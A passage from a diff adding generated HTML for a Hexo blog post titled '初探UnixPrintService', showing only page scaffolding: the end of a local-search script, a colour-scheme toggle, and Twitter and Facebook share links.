+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E5%88%9D%E6%8E%A2UnixPrintService + '&url=' + http%3A%2F%2Fexample.com%2F2023%2F10%2F01%2F%25E5%2588%259D%25E6%258E%25A2UnixPrintService%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2023/10/01/%E5%88%9D%E6%8E%A2UnixPrintService/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
